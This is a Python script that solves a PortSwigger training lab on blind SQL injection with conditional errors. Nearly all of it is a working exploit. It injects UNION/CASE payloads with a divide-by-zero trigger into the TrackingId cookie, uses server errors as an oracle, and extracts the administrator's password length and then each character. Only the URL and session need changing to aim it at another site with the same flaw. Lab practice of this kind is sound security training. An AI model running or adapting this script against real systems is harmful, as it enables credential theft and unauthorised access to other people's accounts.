#!/usr/bin/env python3

import asyncio
import aiohttp
import argparse
import string


def check_error(res: aiohttp.ClientResponse, text: str) -> bool:
    """Check if the response indicates a server error (true condition)."""
    return res.status == 500 or "Internal Server Error" in text


async def get_password_length(
    client: aiohttp.ClientSession,
    url: str,
    session: str,
    username: str = "administrator",
    max_length: int = 30,
) -> int:
    """Determine the password length using conditional errors."""
    for length in range(1, max_length + 1):
        payload = (
            f"' UNION (SELECT CASE WHEN (username='{username}' "
            f"AND LENGTH(password)={length}) "
            f"THEN TO_CHAR(1/0) ELSE NULL END FROM users) --"
        )
        headers = {"Cookie": f"TrackingId={payload}; session={session}"}
        try:
            async with client.get(url, headers=headers, ssl=False) as res:
                text = await res.text()
                if check_error(res, text):
                    print(f"[+] Password length: {length}")
                    return length
        except aiohttp.ClientError as e:
            print(f"[-] Error checking length {length}: {e}")
    return 0


async def extract_password(
    client: aiohttp.ClientSession,
    url: str,
    session: str,
    password_length: int,
    username: str = "administrator",
    chars: str = string.digits + string.ascii_letters,
) -> str:
    """Extract password character by character using conditional errors."""
    password = ""
    for pos in range(1, password_length + 1):
        found = False
        for char in chars:
            payload = (
                f"' UNION (SELECT CASE WHEN (username='{username}' "
                f"AND SUBSTR(password,{pos},1)='{char}') "
                f"THEN TO_CHAR(1/0) ELSE NULL END FROM users) --"
            )
            headers = {"Cookie": f"TrackingId={payload}; session={session}"}
            try:
                async with client.get(url, headers=headers, ssl=False) as res:
                    text = await res.text()
                    if check_error(res, text):
                        password += char
                        print(f"[+] Position {pos}: '{char}' → {password}")
                        found = True
                        break
            except aiohttp.ClientError as e:
                print(f"[-] Error checking position {pos}, char '{char}': {e}")
        if not found:
            print(f"[-] Could not find character at position {pos}")
            break
    return password


async def main():
    parser = argparse.ArgumentParser(
        description="Solve Lab: Blind SQL injection with conditional errors"
    )
    parser.add_argument(
        "-u", "--url", type=str, required=True,
        help="URL of the PortSwigger lab (e.g. https://LAB-ID.web-security-academy.net/)",
    )
    parser.add_argument(
        "-s", "--session", type=str, required=True,
        help="Session cookie value",
    )

    args = parser.parse_args()
    url = args.url.strip()
    session = args.session.strip()

    async with aiohttp.ClientSession(trust_env=True) as client:
        # Step 1: Determine password length
        print("[*] Determining password length...")
        pw_length = await get_password_length(client, url, session)

        if pw_length == 0:
            print("[-] Could not determine password length. Exiting.")
            return

        # Step 2: Extract password character by character
        print(f"[*] Extracting {pw_length}-character password...")
        password = await extract_password(client, url, session, pw_length)

        if password:
            print(f"\n[+] Administrator password: {password}")
        else:
            print("[-] Failed to extract password.")


if __name__ == "__main__":
    asyncio.run(main())
